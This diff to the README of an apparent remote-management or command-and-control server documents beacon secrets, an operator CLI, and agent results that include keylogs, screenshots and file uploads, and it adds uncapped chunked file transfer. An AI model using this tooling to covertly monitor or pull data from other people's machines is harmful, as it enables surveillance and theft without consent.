@@ -53,6 +53,7 @@ export RMM_API_TOKEN="$(python3 -c 'import secrets; print(secrets.token_urlsafe(
 export RMM_BEACON_SECRET="$(python3 -c 'import secrets; print(secrets.token_urlsafe(32))')"
 python server_rmm.py              # default port 8080, bind 127.0.0.1
 python server_rmm.py 9000 --bind 0.0.0.0   # expose on LAN (use firewall + secrets)
+# Optional: RMM_MAX_BODY_BYTES (default 32MB) — max size per download chunk POST
 ```
 
 ### Operator CLI
@@ -210,7 +211,7 @@ Queue the same tokens via `rmm_cli.py run` / `exec` or `POST …/commands`.
 | `type` | Body |
 |--------|------|
 | `output` (default) | JSON `{"rmm_cmd":"…","rmm_output":"…"}` or plain text |
-| `file_upload` | JSON with base64 `content` → `RMM_logs/downloads/` |
+| `file_upload` | JSON with base64 `content` → `RMM_logs/downloads/` (large files sent in **6 MB chunks** with `offset` / `eof`; no fixed size cap) |
 | `screenshot` | Base64 PNG → `RMM_logs/screenshots/` |
 | `keylog` | Text → `RMM_logs/keylogs/` |
 | `config_ack` | Logged / event stream |
